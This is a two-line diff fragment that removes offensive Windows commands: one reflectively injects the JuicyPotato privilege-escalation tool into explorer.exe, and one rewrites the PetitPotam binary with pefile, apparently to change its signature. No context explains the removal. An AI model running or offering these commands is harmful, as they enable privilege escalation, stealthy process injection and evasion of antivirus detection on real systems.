@@ -1,2 +1,0 @@
-Invoke-ReflectivePEInjection -PEPath JuicyPotato.exe -ProcName explorer
-python3 -c "import pefile; pe = pefile.PE('PetitPotam.exe'); pe.OPTIONAL_HEADER.AddressOfEntryPoint += 0; pe.write('PetitPotam_modified.exe')"
